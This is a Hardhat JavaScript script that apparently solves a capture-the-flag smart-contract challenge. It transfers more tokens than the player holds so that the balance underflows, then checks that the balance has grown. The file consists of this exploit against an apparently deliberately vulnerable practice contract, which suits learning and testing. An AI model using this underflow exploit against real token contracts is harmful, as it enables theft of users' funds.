const { ethers } = require("hardhat");
const { expect } = require("chai");
const CONTRACT_ADDRESS = "0x4a057D0eaA196191D22150F22EbBA8703E8ce165";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const amountToSend = ethers.utils.parseEther("21");
  const Token = await ethers.getContractAt(`Token`, CONTRACT_ADDRESS, signer);
  const signers = await ethers.getSigners();
  console.log(await Token.balanceOf(signer.address));
  // Send the transaction
  try {
    const tx = await Token.transfer(signers[10].address, amountToSend);
    await tx.wait();

    if (!tx) {
      console.log("hack failed.............");
      return;
    }
    const afterBalance = await Token.balanceOf(signer.address);
    expect(afterBalance.toNumber()).to.be.greaterThan(amountToSend);
  } catch (error) {
    console.error("Error while sending transaction:", error);
    return false;
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
